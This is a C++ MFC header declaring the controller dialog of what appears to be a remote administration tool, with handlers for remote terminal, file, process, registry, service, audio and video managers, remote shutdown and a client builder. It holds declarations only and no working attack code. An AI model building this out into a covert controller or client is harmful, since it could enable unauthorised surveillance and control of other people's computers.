
// XsServerDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "_ConfigFile.h"
#include "_IOCPServer.h"
#include "Common.h"
#include "DlgRemoteMessage.h"
#include "DlgProcessManager.h"
#include "DlgCmdManager.h"
#include "DlgWindowManager.h"
#include "DlgRemoteControll.h"
#include "DlgFileManager.h"
#include "DlgAudioManager.h"
#include "DlgServiceManager.h"
#include "DlgRegisterManager.h"
#include "DlgCreateClient.h"



#define UM_NOTIFY_ICON_DATA   WM_USER + 0x10

typedef struct 
{
	char*  TitleData;    //列表名称
	int    TitleWidth;   //列表宽度
}COLUMN_DATA;

// CXsServerDlg 对话框
class CXsServerDlg : public CDialogEx
{
// 构造
public:
	CXsServerDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_XSSERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
private:
	CBitmap m_Bitmap[30];
	CStatusBar         m_StatusBar;
	CTrueColorToolBar  m_TrueColorToolBar;
	NOTIFYICONDATA     m_NotifyIconData;   //托盘结构体
	USHORT             m_ListenPort;
	ULONG              m_MaxConnection;
public:
	VOID CXsServerDlg::InitListControl();     //列表
	VOID CXsServerDlg::InitSolidMenu();       //固态菜单
	VOID CXsServerDlg::ShowDialogMessage(BOOL IsOk, CString Message);
	VOID CXsServerDlg::InitStatusBar();       //状态bar
	VOID CXsServerDlg::InitTrueToolBar();     //真彩工具栏

	//动态申请通信引擎对象
	VOID CXsServerDlg::ServerStart();

	//托盘相关
	void CXsServerDlg::InitNotifyIconData();  
	afx_msg void OnNotifyIconData(WPARAM wParam, LPARAM lParam);

	//客户端上线消息函数
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	VOID CXsServerDlg::AddListCtrlServerOnline(CString ClientAddress,
		CString HostName,
		CString OSName, CString ProcessorNameString, CString IsWebCameraExist,
		CString WebSpeed,CONTEXT_OBJECT* ContextObject);

	//与客户端远程消息
	afx_msg LRESULT OnOpenRemoteMessageDialog(WPARAM wParam, LPARAM lParam);

	//终端管理
	afx_msg VOID OnButtonCmdManager();
	afx_msg LRESULT CXsServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);

	
	//窗口管理
	afx_msg VOID OnButtonWindowManager();
	afx_msg LRESULT CXsServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);
	//远程控制
	afx_msg VOID OnButtonRemoteControll();
	afx_msg LRESULT CXsServerDlg::OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam);
	//文件管理
	afx_msg VOID OnButtonFileManager();
	afx_msg LRESULT CXsServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);
	//语音管理
	afx_msg VOID OnButtonAudioManager();
	afx_msg LRESULT CXsServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);
	//系统清理
	afx_msg VOID OnButtonCleanManager();
	//视频管理
	afx_msg VOID OnButtonVideoManager();
	afx_msg LRESULT CXsServerDlg::OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//服务管理
	afx_msg VOID OnButtonServiceManager();
	LRESULT CXsServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);
	//注册表管理
	afx_msg VOID OnButtonRegisterManager();
	LRESULT CXsServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	//服务端管理
	afx_msg VOID OnButtonServerManager();
	//客户端管理
	afx_msg VOID OnButtonCreateClient();
	//关于
	afx_msg VOID OnButtonServerAbout();

	//窗口回调
	static VOID CALLBACK CXsServerDlg::WindowsNotifyProcedure(PCONTEXT_OBJECT ContextObject);
	static VOID CXsServerDlg::WindowHandleIO(PCONTEXT_OBJECT ContextObject);

	//进程管理消息
	afx_msg VOID OnButtonProcessManager();
	afx_msg LRESULT CXsServerDlg::OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam);


public:
	CListCtrl m_CListCtrl_Server_Dialog_Online;
	CListCtrl m_CListCtrl_Server_Dialog_Message;

	//窗口主菜单
	afx_msg void OnMenuServerDialogSet();
	afx_msg void OnMenuServerDialogExit();
	afx_msg void OnMenuServerDialogAdd();

	afx_msg void OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult);

	//OnlineListControl菜单
	afx_msg void OnMenuServerDialogOnlineListDisconnection();
	afx_msg void OnMenuServerDialogOnlineListRemoteMessage();
	afx_msg void OnMenuServerDialogOnlineListRemoteShutdown();
	VOID CXsServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);


	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnNotifyIconDataShow();
	afx_msg void OnNotifyIconDataExit();
};
